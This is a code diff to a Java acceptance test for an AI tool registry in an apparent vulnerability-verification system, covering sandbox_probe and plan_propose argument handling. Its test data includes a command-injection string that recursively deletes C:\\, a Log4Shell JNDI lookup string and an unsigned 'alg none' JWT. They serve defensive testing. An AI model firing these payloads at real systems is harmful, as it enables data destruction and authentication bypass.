@@ -4,6 +4,7 @@ import com.aq.jvmsentinel.ai.tool.CanonicalToolContracts.OutputKind;
 import com.aq.jvmsentinel.ai.tool.CanonicalToolContracts.ToolCall;
 import com.aq.jvmsentinel.ai.tool.CanonicalToolContracts.ToolResult;
 import com.aq.jvmsentinel.ai.tool.CanonicalToolContracts.ToolStatus;
+import com.aq.jvmsentinel.control.ApiDtos;
 import com.aq.jvmsentinel.provider.AgentRole;
 import com.fasterxml.jackson.databind.JsonNode;
 import com.fasterxml.jackson.databind.ObjectMapper;
@@ -40,6 +41,9 @@ public final class AiToolRegistryAcceptanceTest {
         budgetsAndUnknownToolsFailClosed(registry);
         jsonBoundsAndSchemasAreEnforced(registry);
         resultOverflowIsTruncatedOrDenied(registry, source);
+        entryReferenceContractsAreStable(registry, source);
+        missingAuthSandboxProbeIsValid(registry, source);
+        bladeAuthHeaderOptionalBlankIsValid(registry, source);
         terminalStatusesAreExplicit(registry);
 
         System.out.println("AiToolRegistryAcceptanceTest: PASS");
@@ -80,7 +84,7 @@ public final class AiToolRegistryAcceptanceTest {
 
     private static void promptInjectionRemainsOpaque(AiToolRegistry registry) {
         ObjectNode arguments = JSON.createObjectNode();
-        arguments.put("entrypointRef", "evidence:entry-a");
+        arguments.put("entrypointRef", "entry:entry-a");
         arguments.put("objective", INJECTION);
         arguments.putArray("candidateInputs").add("'; Remove-Item C:\\\\ -Recurse").add("${jndi:ldap://bad}");
         ToolResult result = registry.execute(call("inject", "plan_propose", arguments),
@@ -177,6 +181,173 @@ public final class AiToolRegistryAcceptanceTest {
                 "single oversized evidence result is refused");
     }
 
+    private static void entryReferenceContractsAreStable(AiToolRegistry registry, FakeSource source) {
+        ObjectNode nonEntryPlan = planArguments();
+        nonEntryPlan.put("entrypointRef", "evidence:entry-a");
+        ToolResult nonEntryPlanResult = registry.execute(call("plan-non-entry", "plan_propose", nonEntryPlan),
+                context(AgentRole.PATH_EXPLORATION, 1, 4096, 8, 4096));
+        check(nonEntryPlanResult.status() == ToolStatus.INVALID_ARGUMENTS
+                        && nonEntryPlanResult.errorCode().equals("ENTRYPOINT_REF_MUST_BE_ENTRY"),
+                "plan_propose rejects non-entry refs with stable code");
+
+        ObjectNode unknownPlan = planArguments();
+        unknownPlan.put("entrypointRef", "entry:missing");
+        ToolResult unknownPlanResult = registry.execute(call("plan-missing-entry", "plan_propose", unknownPlan),
+                context(AgentRole.PATH_EXPLORATION, 1, 4096, 8, 4096));
+        check(unknownPlanResult.status() == ToolStatus.NOT_FOUND
+                        && unknownPlanResult.errorCode().equals("ENTRYPOINT_NOT_FOUND"),
+                "plan_propose rejects unknown entries with stable code");
+
+        ToolResult nonEntryProbe = registry.execute(call("probe-non-entry", "sandbox_probe",
+                        object("entrypointRef", "/invented/path")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(nonEntryProbe.status() == ToolStatus.INVALID_ARGUMENTS
+                        && nonEntryProbe.errorCode().equals("ENTRYPOINT_REF_MUST_BE_ENTRY"),
+                "sandbox_probe rejects invented routes");
+
+        ToolResult unknownProbe = registry.execute(call("probe-missing-entry", "sandbox_probe",
+                        object("entrypointRef", "entry:missing")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(unknownProbe.status() == ToolStatus.NOT_FOUND
+                        && unknownProbe.errorCode().equals("ENTRYPOINT_NOT_FOUND"),
+                "sandbox_probe rejects unknown entries");
+
+        source.probeMode = ProbeMode.BUSY;
+        ToolResult busy = registry.execute(call("probe-busy", "sandbox_probe",
+                        object("entrypointRef", "entry:entry-a")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(busy.status() == ToolStatus.SUCCESS, "busy probe returns a fact");
+        JsonNode busyFact = busy.outputs().get(0).value();
+        check(busyFact.get("state").asText().equals("BUSY") && busyFact.get("retryable").asBoolean(),
+                "busy probe fact is actionable");
+
+        source.probeMode = ProbeMode.EMPTY_PROBE_EVENTS;
+        ToolResult emptyProbe = registry.execute(call("probe-empty", "sandbox_probe",
+                        object("entrypointRef", "entry:entry-a")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(emptyProbe.status() == ToolStatus.SUCCESS, "failed probe returns a fact");
+        JsonNode failureFact = emptyProbe.outputs().get(0).value();
+        check(failureFact.get("state").asText().equals("FAILED")
+                        && failureFact.get("failureCode").asText().equals("EMPTY_PROBE_EVENTS")
+                        && failureFact.get("stopReason").asText().equals("WORKER_FAILURE")
+                        && failureFact.get("lifecycle").asText().equals("FAILED"),
+                "probe failure code is model-visible");
+
+        ToolResult bareId = registry.execute(call("probe-bare-id", "sandbox_probe",
+                        object("entrypointRef", "entry-a")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(bareId.status() == ToolStatus.SUCCESS
+                        && bareId.outputs().get(0).value().get("entrypointRef").asText().equals("entry:entry-a"),
+                "bare scan entry id aliases to canonical entry ref");
+
+        ToolResult methodRoute = registry.execute(call("probe-method-route", "sandbox_probe",
+                        object("entrypointRef", "entry:GET:/demo/a")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(methodRoute.status() == ToolStatus.SUCCESS
+                        && methodRoute.outputs().get(0).value().get("entrypointRef").asText()
+                        .equals("entry:entry-a"),
+                "unambiguous entry:METHOD:route aliases to scan entry id");
+
+        ToolResult ambiguous = registry.execute(call("probe-ambiguous", "sandbox_probe",
+                        object("entrypointRef", "entry:GET:/shared")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(ambiguous.status() == ToolStatus.INVALID_ARGUMENTS
+                        && ambiguous.errorCode().equals("ENTRYPOINT_REF_AMBIGUOUS"),
+                "ambiguous METHOD:route returns stable code");
+
+        source.probeMode = ProbeMode.THROW;
+        ToolResult thrown = registry.execute(call("probe-throw", "sandbox_probe",
+                        object("entrypointRef", "entry:entry-a")),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(thrown.status() == ToolStatus.SUCCESS, "probe executor exception returns a fact");
+        JsonNode thrownFact = thrown.outputs().get(0).value();
+        check(thrownFact.get("state").asText().equals("FAILED")
+                        && thrownFact.hasNonNull("failureCode")
+                        && thrownFact.get("stopReason").asText().equals("WORKER_FAILURE")
+                        && thrownFact.get("lifecycle").asText().equals("FAILED"),
+                "opaque executor failures expose failureCode/stopReason/lifecycle");
+        source.probeMode = ProbeMode.NONE;
+    }
+
+    /** Live bug: model passed authorizationHeader:"" for MISSING_AUTH → ARGUMENT_SCHEMA_MISMATCH. */
+    private static void missingAuthSandboxProbeIsValid(AiToolRegistry registry, FakeSource source) {
+        source.probeMode = ProbeMode.BUSY;
+        source.lastTechniqueId = null;
+        source.lastAuthorizationHeader = "sentinel";
+
+        ObjectNode emptyAuth = object("entrypointRef", "entry:entry-a");
+        emptyAuth.put("techniqueId", "MISSING_AUTH");
+        emptyAuth.put("authorizationHeader", "");
+        ToolResult withEmpty = registry.execute(call("probe-missing-auth-empty", "sandbox_probe", emptyAuth),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(withEmpty.status() == ToolStatus.SUCCESS, "MISSING_AUTH with empty authorizationHeader is valid");
+        check("MISSING_AUTH".equals(source.lastTechniqueId), "techniqueId reaches executor");
+        check(source.lastAuthorizationHeader == null,
+                "empty authorizationHeader is normalized to null (no fake bearer)");
+
+        ObjectNode omittedAuth = object("entrypointRef", "entry:entry-a");
+        omittedAuth.put("techniqueId", "MISSING_AUTH");
+        ToolResult omitted = registry.execute(call("probe-missing-auth-omit", "sandbox_probe", omittedAuth),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(omitted.status() == ToolStatus.SUCCESS, "MISSING_AUTH with omitted authorizationHeader is valid");
+        check(source.lastAuthorizationHeader == null, "omitted authorizationHeader stays null");
+
+        ObjectNode blankRequired = object("entrypointRef", "");
+        blankRequired.put("techniqueId", "MISSING_AUTH");
+        ToolResult blankEntry = registry.execute(call("probe-blank-entry", "sandbox_probe", blankRequired),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(blankEntry.status() == ToolStatus.INVALID_ARGUMENTS
+                        && "MISSING_ARGUMENT".equals(blankEntry.errorCode()),
+                "required entrypointRef still rejects blank");
+
+        source.probeMode = ProbeMode.NONE;
+        source.lastTechniqueId = null;
+        source.lastAuthorizationHeader = null;
+        source.lastBladeAuthHeader = null;
+    }
+
+    /** Optional bladeAuthHeader may be blank/omitted; channels stay independent. */
+    private static void bladeAuthHeaderOptionalBlankIsValid(AiToolRegistry registry, FakeSource source) {
+        source.probeMode = ProbeMode.BUSY;
+        source.lastBladeAuthHeader = "sentinel";
+        source.lastAuthorizationHeader = "sentinel";
+
+        ObjectNode blankBlade = object("entrypointRef", "entry:entry-a");
+        blankBlade.put("techniqueId", "ALG_NONE");
+        blankBlade.put("authorizationHeader", "eyJhbGciOiJub25lIn0.e30.");
+        blankBlade.put("bladeAuthHeader", "");
+        ToolResult withBlankBlade = registry.execute(
+                call("probe-blade-blank", "sandbox_probe", blankBlade),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(withBlankBlade.status() == ToolStatus.SUCCESS, "blank bladeAuthHeader is schema-valid");
+        check(source.lastBladeAuthHeader == null, "blank bladeAuthHeader normalizes to null");
+        check(source.lastAuthorizationHeader != null, "authorizationHeader still reaches executor");
+
+        ObjectNode omittedBlade = object("entrypointRef", "entry:entry-a");
+        omittedBlade.put("techniqueId", "ALG_NONE");
+        omittedBlade.put("authorizationHeader", "eyJhbGciOiJub25lIn0.e30.");
+        ToolResult omitted = registry.execute(
+                call("probe-blade-omit", "sandbox_probe", omittedBlade),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(omitted.status() == ToolStatus.SUCCESS, "omitted bladeAuthHeader is valid");
+        check(source.lastBladeAuthHeader == null, "omitted bladeAuthHeader stays null");
+
+        ObjectNode bladeOnly = object("entrypointRef", "entry:entry-a");
+        bladeOnly.put("techniqueId", "CUSTOM_POC");
+        bladeOnly.put("bladeAuthHeader", "blade-token-only");
+        ToolResult blade = registry.execute(
+                call("probe-blade-only", "sandbox_probe", bladeOnly),
+                context(AgentRole.DYNAMIC_VERIFICATION, 1, 4096, 8, 4096));
+        check(blade.status() == ToolStatus.SUCCESS, "blade-only sandbox_probe is valid");
+        check("blade-token-only".equals(source.lastBladeAuthHeader), "bladeAuthHeader reaches executor");
+        check(source.lastAuthorizationHeader == null, "blade-only does not invent authorizationHeader");
+
+        source.probeMode = ProbeMode.NONE;
+        source.lastTechniqueId = null;
+        source.lastAuthorizationHeader = null;
+        source.lastBladeAuthHeader = null;
+    }
+
     private static void terminalStatusesAreExplicit(AiToolRegistry registry) {
         check(EnumSet.allOf(ToolStatus.class).equals(EnumSet.of(
                 ToolStatus.SUCCESS, ToolStatus.DENIED, ToolStatus.INVALID_ARGUMENTS,
@@ -218,7 +389,7 @@ public final class AiToolRegistryAcceptanceTest {
 
     private static ObjectNode planArguments() {
         ObjectNode object = JSON.createObjectNode();
-        object.put("entrypointRef", "evidence:entry-a");
+        object.put("entrypointRef", "entry:entry-a");
         object.put("objective", "review path");
         return object;
     }
@@ -230,6 +401,14 @@ public final class AiToolRegistryAcceptanceTest {
     private static final class FakeSource implements ToolDataSource {
         private boolean returnWrongScope;
         private boolean manyFacts;
+        private ProbeMode probeMode = ProbeMode.NONE;
+        private String lastTechniqueId;
+        private String lastAuthorizationHeader;
+        private String lastBladeAuthHeader;
+        private final List<ApiDtos.EntryDto> entries = List.of(
+                entry("entry-a", "GET", "/demo/a"),
+                entry("entry-shared-1", "GET", "/shared"),
+                entry("entry-shared-2", "GET", "/shared"));
 
         @Override
         public List<FactRecord> searchFacts(ToolExecutionContext.Scope scope, String kind,
@@ -249,6 +428,11 @@ public final class AiToolRegistryAcceptanceTest {
 
         @Override
         public Optional<FactRecord> findEvidence(ToolExecutionContext.Scope scope, String evidenceRef) {
+            EntryRefResolver.Resolution resolution = EntryRefResolver.resolve(entries, evidenceRef);
+            if (resolution.resolved()) {
+                return Optional.of(new FactRecord(scope, resolution.canonicalRef(),
+                        object("entrypoint", "fixture.Controller#create")));
+            }
             if (evidenceRef.equals("evidence:entry-a")) {
                 return Optional.of(new FactRecord(scope, evidenceRef,
                         object("entrypoint", "fixture.Controller#create")));
@@ -259,5 +443,79 @@ public final class AiToolRegistryAcceptanceTest {
             }
             return Optional.empty();
         }
+
+        @Override
+        public Optional<FactRecord> resolveEntrypoint(ToolExecutionContext.Scope scope, String entrypointRef) {
+            EntryRefResolver.Resolution resolution = EntryRefResolver.resolve(entries, entrypointRef);
+            if (!resolution.resolved()) {
+                if (resolution.status() == EntryRefResolver.Status.AMBIGUOUS) {
+                    throw new IllegalArgumentException(EntryRefResolver.CODE_AMBIGUOUS);
+                }
+                if (resolution.status() == EntryRefResolver.Status.MUST_BE_ENTRY) {
+                    throw new IllegalArgumentException(EntryRefResolver.CODE_MUST_BE_ENTRY);
+                }
+                return Optional.empty();
+            }
+            return Optional.of(new FactRecord(scope, resolution.canonicalRef(),
+                    object("entrypoint", "fixture.Controller#create")));
+        }
+
+        @Override
+        public Optional<FactRecord> requestSandboxProbe(ToolExecutionContext.Scope scope,
+                                                       String principalId,
+                                                       String jobId,
+                                                       String entrypointRef,
+                                                       List<String> candidateInputs,
+                                                       int maxRequests,
+                                                       String techniqueId,
+                                                       String authorizationHeader,
+                                                       String bladeAuthHeader) {
+            if (probeMode == ProbeMode.NONE) return Optional.empty();
+            if (probeMode == ProbeMode.THROW) {
+                throw new IllegalStateException("EXTERNAL_ARTIFACT_EXIT_NONZERO");
+            }
+            ObjectNode value = JSON.createObjectNode();
+            value.put("schemaVersion", 1);
+            value.put("scanId", "scan-a");
+            value.put("entrypointRef", entrypointRef);
+            value.put("networkMode", "DENY");
+            value.put("executor", "SERVER_OWNED_TRUSTED_DOCKER");
+            lastTechniqueId = techniqueId;
+            lastAuthorizationHeader = authorizationHeader;
+            lastBladeAuthHeader = bladeAuthHeader;
+            if (techniqueId != null && !techniqueId.isBlank()) {
+                value.put("techniqueId", techniqueId);
+            }
+            if (authorizationHeader != null && !authorizationHeader.isBlank()) {
+                value.put("authorizationHeaderPresent", true);
+            }
+            if (bladeAuthHeader != null && !bladeAuthHeader.isBlank()) {
+                value.put("bladeAuthHeaderPresent", true);
+            }
+            if (probeMode == ProbeMode.BUSY) {
+                value.put("state", "BUSY");
+                value.put("retryable", true);
+                return Optional.of(new FactRecord(scope, "sandbox-probe:busy:" + jobId, value));
+            }
+            value.put("state", "FAILED");
+            value.put("lifecycle", "FAILED");
+            value.put("stopReason", "WORKER_FAILURE");
+            value.put("failureCode", "EMPTY_PROBE_EVENTS");
+            value.putArray("pathRuns");
+            return Optional.of(new FactRecord(scope, "sandbox-probe:task-a", value));
+        }
+
+        private static ApiDtos.EntryDto entry(String id, String method, String route) {
+            return new ApiDtos.EntryDto(ApiDtos.SCHEMA_VERSION, "project-a", "digest-a", "scan-a",
+                    id, "HTTP", method, route, "fixture.Controller", "Controller",
+                    List.of(), List.of(), ApiDtos.STATIC_INFERRED, 0.5d, 0, List.of());
+        }
+    }
+
+    private enum ProbeMode {
+        NONE,
+        BUSY,
+        EMPTY_PROBE_EVENTS,
+        THROW
     }
 }
